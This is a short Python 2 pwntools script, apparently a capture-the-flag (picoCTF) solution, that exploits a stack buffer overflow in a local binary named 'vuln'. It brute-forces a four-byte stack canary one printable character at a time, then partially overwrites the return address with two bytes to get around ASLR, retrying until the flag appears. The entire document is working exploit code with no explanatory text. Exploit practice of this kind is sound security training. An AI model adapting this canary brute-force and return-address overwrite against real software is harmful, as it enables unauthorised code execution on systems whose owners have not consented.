#!/usr/bin/env python2
from pwn import *
from string import printable
import struct
context.log_level = logging.ERROR
canary = ''
while len(canary) < 4:
	for c in printable[:-6]:
		p = process('./vuln')
		p.sendline(str(33+len(canary)))
		p.sendline('a'*32+canary+c)
		data = p.recvall()
		if "Stack Smashing Detected" not in data:
			canary+=c
			print(canary)
			break
for i in range(32):#aslr, last 12 bits are not randomized so we have big chance to get flag every 16 requests
	p = process('./vuln')
	payload = 'a'*32+canary+'a'*16+struct.pack('<I',0x7ED)[:2]
	p.sendline(str(len(payload)))
	p.sendline(payload)
	res = p.recvall()
	if "pico" in res:
		print(res)